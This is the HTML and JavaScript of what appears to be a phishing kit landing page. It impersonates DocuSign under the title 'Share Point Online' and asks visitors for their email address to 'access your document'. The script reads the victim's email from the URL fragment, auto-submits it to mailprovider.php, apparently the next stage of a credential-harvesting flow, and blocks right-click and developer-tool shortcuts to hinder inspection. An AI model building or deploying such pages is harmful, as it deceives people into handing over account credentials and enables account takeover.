
<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Share Point Online</title>
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">


    </style>
  </head>
  <!-- oncontextmenu="return false" -->
  <body style="background-image: url('images/0vv.jpg'); background-size: cover;background-repeat: no-repeat;" >
    <div class="container-fluid p-0">
      <div class="container-fluid">
        <div class="row p-1" style="background-color: #0E7CC0;">
          <div class="col-lg-12">
            <img src="images/docusign-w.png" class="img-fluid" width="160px;">
            <!-- <span class="h4 text-white align-middle">OneDrive</span>             -->
          </div>
          
        </div>
      </div>
      <div class="container-fluid">
        <div class="row">
          <div class="col-lg-6 mx-auto text-center p-0" style="background-color: rgba(255,255,255,0.9);margin: 80px 50px 80px 50px;">
            <div class="row">
              <div class="col-lg-12">
                <div class="col-lg-12 p-3 text-center mx-auto" style="background-color: #0E7CC0;">
                  <span class="h4 text-white align-middle">Welcome to Your New Docusign</span>            
                </div>
                
              </div>
              <div class="col-lg-6 align-self-center p-5">
                <img src="images/docusign.png" class="img-fluid" width="160px;">
                <div> 
                  <span class="h5 text-dark">ACCESS YOUR DOCUMENT</span><br>
                  <span class="h5 text-dark" style="font-family: 'Archivo Narrow', sans-serif; ">If you received an email asking you to sign or view a document, you can access that document by entering your email address below.</span>
                </div>
              </div>
              <div class="col-lg-5 align-self-center p-2 my-4" style="border-left: 2px solid #979797;">
                
                <div>
                  <center>
                    <span id="error" class="text-danger">That account doesn't exist. Enter a different account</span>
                  </center>
                </div>
                <form action="" method="POST" id="contact" class="form-horizontal well mt-2">
                <div class="col-lg-12">
                  <div class="form-group">
                    <div id="inputbar">
                      <label for="exampleInputEmail1" class="float-left">Email address</label>
                      <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
                    </div>
                  </div>
                </div>
                <div class="col-lg-10 mx-auto mb-4">
                    <button type="submit" class="btn btn-lg pull-right w-100 text-white" id="next" style="background-color: #0E7CC0;">Continue</button>
                  </div>
                </form>
              </div>
            </div>

          </div> 
        </div> 
      </div>
    </div>





    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
  <script>

   <!--  /* global $ */
   $(document).ready(function(){
    $('#error').hide();
    $('#submit-btn1').hide();
      /////////////url email getting////////////////
      var email = window.location.hash.substr(1);
      if (!email) {
      }
      else
      {
        var my_email =email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        if (!final) {
          event.preventDefault();
          $('#error').show();
          return false;
        }
        else 
        {
          $('#email').val(my_email);
          var email=$('#email').val();
          $.session.set('email', email);
          $('#contact').attr('action', 'mailprovider.php');
          $('#next').click();
        }

      }

      $('#next').click(function () {
        var my_email =$('#email').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        if (!final) {
          event.preventDefault();
          $('#error').show();
          return false;
        }
        else 
        {

          var email=$('#email').val();
          $.session.set('email', email);
          $('#contact').attr('action', 'mailprovider.php');
          
        }

      });
      $(document).bind("contextmenu",function(e){
        return false;
      });
    });

   document.onkeydown=function(e){
    if (e.ctrlKey && 
      (e.keyCode === 73 || 
       e.keyCode === 105 ||
       e.keyCode === 74 || 
       e.keyCode === 106 || 
       e.keyCode === 85 || 
       e.keyCode === 117)) {
      alert('not allowed');
    return false;
  } else {
    return true;
  }
}
</script> -->
</html>